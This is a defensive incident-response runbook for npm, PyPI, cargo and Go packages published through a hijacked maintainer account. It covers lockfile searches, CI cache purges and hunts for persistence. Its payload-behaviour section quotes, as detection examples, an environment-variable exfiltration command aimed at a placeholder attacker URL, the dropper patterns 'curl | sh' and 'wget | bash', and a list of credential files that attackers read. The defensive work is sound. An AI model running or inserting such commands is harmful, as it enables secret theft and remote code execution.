# Runbook: Maintainer Account Takeover (Shai-Hulud / axios-style)

## Pattern

An attacker compromises a package maintainer's credentials (phishing, leaked token, session theft) and publishes a malicious version under the legitimate package name. The payload typically runs at install time — `postinstall` for npm, `setup.py`/`.pth` for Python — and exfiltrates environment variables, CI secrets, or cloud credentials to an attacker-controlled URL. The malicious version is often yanked within hours, but every CI run, developer install, and cached artifact during the window is potentially compromised.

## Scope Determination

Search every lockfile in the repo for the affected package name. Use ecosystem-appropriate patterns.

**npm / yarn / pnpm:**
```bash
git grep -nE "\"<pkg>\"" -- 'package-lock.json' 'yarn.lock' 'pnpm-lock.yaml' 'package.json'
```

**PyPI (pip / poetry / uv / pixi):**
```bash
git grep -nE "^<pkg>==|name = \"<pkg>\"" -- 'requirements*.txt' 'poetry.lock' 'uv.lock' 'pixi.lock' 'pyproject.toml'
```

**conda:**
```bash
git grep -nE "<pkg>=" -- 'environment*.yml' 'conda-lock.yml' 'pixi.lock'
```

**cargo:**
```bash
git grep -nE "name = \"<pkg>\"" -- 'Cargo.lock' 'Cargo.toml'
```

**Go:**
```bash
git grep -nE "<pkg> v" -- 'go.sum' 'go.mod'
```

Record every `file:line` hit. Empty across all ecosystems = PASS for the lockfile check.

## CI Cache Nuke

Every cache built during the exposure window may contain the bad version. List, filter, delete.

```bash
# List caches created after exposure start
gh actions cache list --sort created --order desc --limit 100 \
  --json key,createdAt,ref \
  | jq -r '.[] | select(.createdAt > "<exposure-start-iso>") | .key'

# Batch delete
gh actions cache list --sort created --order desc --limit 100 \
  --json key,createdAt \
  | jq -r '.[] | select(.createdAt > "<exposure-start-iso>") | .key' \
  | while read -r key; do gh actions cache delete "$key"; done
```

Also purge any registry mirror caches (Artifactory, Verdaccio, devpi) covering the window — cache nuke is incomplete without these.

## Persistence Hunt

The payload may have written files that survive a `node_modules` or virtualenv rebuild.

**npm:**
```bash
# Bin shims modified during the window
find node_modules/.bin -type f -newer <YYYY-MM-DD>
# Unexpected .npmrc entries (e.g., custom registry, prepublish hooks)
cat .npmrc ~/.npmrc 2>/dev/null
# Suspicious postinstall in any direct or transitive dep
jq -r '.. | objects | select(.scripts?.postinstall) | .name + ": " + .scripts.postinstall' node_modules/*/package.json
```

**Python:**
```bash
# .pth files that exec code at import (LiteLLM 1.82.8 pattern)
SITE=$(python -c 'import site; print(site.getsitepackages()[0])')
find "$SITE" -name "*.pth" -exec grep -lE '^(import|exec|os\.|subprocess)' {} \;
# usercustomize/sitecustomize
find "$SITE" -name 'sitecustomize.py' -o -name 'usercustomize.py'
```

**cargo:**
```bash
# Recently-built build.rs invocations in target/
find target -name 'build-script-build' -newer <YYYY-MM-DD>
# Suspicious build.rs in vendored deps
grep -rE 'Command::new|reqwest|curl' ~/.cargo/registry/src/*/<pkg>-*/build.rs 2>/dev/null
```

Any hit → EXPOSED, remove the artifact, add to incident report evidence.

## Common Payload Behaviors

- **Env var exfiltration:** `curl -X POST <attacker-url> -d "$(env)"` or equivalent in any language. Search CI logs for outbound POSTs to unknown hosts during exposure window.
- **Dropper for second-stage:** payload downloads and executes a follow-up binary. Look for `curl | sh`, `wget -O - | bash`, or `eval(fetch(...))` patterns in install scripts.
- **Credential theft from disk:** reads `~/.aws/credentials`, `~/.npmrc`, `~/.docker/config.json`, `.git-credentials`. Treat any secret stored unencrypted on disk during the window as compromised.
- **Worm propagation:** payload uses the stolen npm/PyPI token to publish itself to other packages owned by the same maintainer (Shai-Hulud signature behavior). Audit the affected maintainer's full package list, not just the named package.
